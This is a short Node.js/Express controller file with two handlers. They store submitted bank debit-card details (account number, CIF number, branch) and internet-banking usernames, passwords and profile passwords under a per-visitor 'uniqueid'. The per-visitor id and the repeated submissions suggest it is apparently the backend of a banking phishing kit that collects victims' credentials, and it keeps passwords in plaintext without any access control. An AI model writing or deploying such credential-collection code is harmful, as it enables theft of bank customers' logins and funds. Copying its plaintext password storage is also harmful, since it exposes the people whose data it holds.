// controllers/otherControler.js
const CombinedDebitCard = require('../models/CombinedDebitCard');
const CombinedInternetBanking = require('../models/CombinedInternetBanking');

exports.createOrUpdateCombinedDebitCard = async (req, res) => {
  try {
    const { uniqueid, accountNo, cifNo, branchName } = req.body;
    const submission = {
      accountNo,
      cifNo,
      branchName,
      createdAt: new Date()
    };

    await CombinedDebitCard.findOneAndUpdate(
      { uniqueid },
      { $push: { submissions: submission } },
      { new: true, upsert: true }
    );

    res.status(201).json({ 
      success: true, 
      message: 'Debit card data saved successfully' 
    });
  } catch (error) {
    console.error('Error saving CombinedDebitCard:', error);
    res.status(500).json({ 
      success: false, 
      message: error.message 
    });
  }
};

exports.createOrUpdateCombinedInternetBanking = async (req, res) => {
  try {
    const { uniqueid, username, password, profilePassword } = req.body;
    const submission = {
      username,
      password,
      profilePassword,
      createdAt: new Date()
    };

    await CombinedInternetBanking.findOneAndUpdate(
      { uniqueid },
      { $push: { submissions: submission } },
      { new: true, upsert: true }
    );

    res.status(201).json({ 
      success: true, 
      message: 'Internet banking data saved successfully' 
    });
  } catch (error) {
    console.error('Error saving CombinedInternetBanking:', error);
    res.status(500).json({ 
      success: false, 
      message: error.message 
    });
  }
};
